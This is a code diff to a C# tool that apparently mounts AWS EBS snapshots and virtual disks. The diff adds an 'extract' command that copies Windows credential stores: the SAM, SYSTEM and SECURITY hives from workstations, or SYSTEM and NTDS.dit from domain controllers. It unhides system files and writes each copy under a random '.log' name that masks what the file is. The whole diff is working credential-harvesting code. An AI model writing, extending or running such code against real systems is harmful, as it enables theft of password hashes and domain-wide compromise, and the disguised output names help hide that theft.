@@ -67,6 +67,8 @@ namespace DiscImage.EbsDiscTest {
             string path = "";
 
             string output = null;
+            string mode = null;
+            string volumeId = null;
 
             OptionSet option_set = new OptionSet()
                 .Add("h|help", "Display this help", v => showHelp = v != null)
@@ -74,10 +76,12 @@ namespace DiscImage.EbsDiscTest {
                 .Add("awskey=", "AWS access key to use", v => awsAccessKey = v)
                 .Add("awssecret=", "AWS secret", v => awsAccessSecret = v)
                 .Add("awsregion=", "AWS region", v => awsRegion = v)
-                .Add("command=", "The command to execute: [volumes|ls|download]", v => command = v)
+                .Add("command=", "The command to execute: [volumes|ls|download|extract]", v => command = v)
                 .Add("image=", @"The path to the virtual disk, e.g. C:\temp\backup.vhdx or ebs://snapshotid", v => image = v)
                 .Add("path=", @"Volume and path to query within the virtual disk filesystem ", v => path = v)
-                .Add("o|output=", "Destination path for downloaded files (file path or directory)", v => output = v);
+                .Add("o|output=", "Destination path for downloaded files (file path or directory)", v => output = v)
+                .Add("m|mode=", "Extract mode: [ws|dc]", v => mode = v)
+                .Add("volume=", "Volume ID for extract command", v => volumeId = v);
 
             try {
 
@@ -183,6 +187,82 @@ namespace DiscImage.EbsDiscTest {
                             File.WriteAllBytes(outputFile, StreamUtilities.ReadExact(fileStream, (int)fileStream.Length));
                             Console.WriteLine($"[+] Saved to {outputFile}");
                         }
+
+                    } else if (command == "extract") {
+
+                        if (string.IsNullOrEmpty(mode)) {
+                            Console.WriteLine("[!] --mode is required for extract (workstation|ws|dc)");
+                            return;
+                        }
+
+                        string[] sourceFiles;
+                        switch (mode.ToLower()) {
+                            case "ws":
+                                sourceFiles = new[] {
+                                    @"\Windows\system32\config\SAM",
+                                    @"\Windows\system32\config\SYSTEM",
+                                    @"\Windows\system32\config\SECURITY"
+                                };
+                                break;
+                            case "dc":
+                                sourceFiles = new[] {
+                                    @"\Windows\system32\config\SYSTEM",
+                                    @"\Windows\NTDS\ntds.dit"
+                                };
+                                break;
+                            default:
+                                Console.WriteLine($"[!] Unknown mode: {mode}. Use ws or dc");
+                                return;
+                        }
+
+                        if (string.IsNullOrEmpty(volumeId)) {
+                            Console.WriteLine("[!] --volume is required for extract");
+                            return;
+                        }
+
+                        var vol = VolumeManager.GetVolume(volumeId);
+                        var sparseStream = vol.Open();
+                        Console.WriteLine($"[+] Opened volume with ID {volumeId}");
+
+                        var fsInfo = FileSystemManager.DetectFileSystems(sparseStream);
+                        var fs = fsInfo[0].Open(sparseStream);
+                        if (fs is NtfsFileSystem) {
+                            ((NtfsFileSystem)fs).NtfsOptions.HideHiddenFiles = false;
+                            ((NtfsFileSystem)fs).NtfsOptions.HideSystemFiles = false;
+                        }
+
+                        var outputDir = string.IsNullOrEmpty(output) ? "." : output;
+                        if (!Directory.Exists(outputDir))
+                            Directory.CreateDirectory(outputDir);
+
+                        int extracted = 0;
+                        foreach (var srcPath in sourceFiles) {
+                            try {
+                                using (var fileStream = fs.OpenFile(srcPath, FileMode.Open, FileAccess.Read)) {
+                                    var randomName = GenerateRandomFileName();
+                                    var destPath = Path.Combine(outputDir, randomName);
+
+                                    using (var outStream = new FileStream(destPath, FileMode.CreateNew, FileAccess.Write)) {
+                                        byte[] buffer = new byte[512 * 1024];
+                                        long totalRead = 0;
+                                        while (fileStream.Position < fileStream.Length) {
+                                            int readSize = fileStream.Read(buffer, 0, buffer.Length);
+                                            outStream.Write(buffer, 0, readSize);
+                                            totalRead += readSize;
+                                        }
+                                    }
+
+                                    var size = new FileInfo(destPath).Length;
+                                    Console.WriteLine($"[+] {srcPath} -> {randomName} ({GetHumanSize(size)})");
+                                    extracted++;
+                                }
+                            } catch (Exception ex) {
+                                Console.WriteLine($"[!] Failed to extract {srcPath}: {ex.Message}");
+                            }
+                        }
+
+                        Console.WriteLine($"[+] Extract complete: {extracted} files");
+
                     }
                 } else {
 
@@ -348,6 +428,13 @@ namespace DiscImage.EbsDiscTest {
                     }                    
                 }
             }          
+        }
+
+        static string GenerateRandomFileName() {
+            var bytes = new byte[4];
+            using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create())
+                rng.GetBytes(bytes);
+            return BitConverter.ToString(bytes).Replace("-", "").ToLower() + ".log";
         }
 
         static string ResolveOutputPath(string output, string sourceFilePath) {
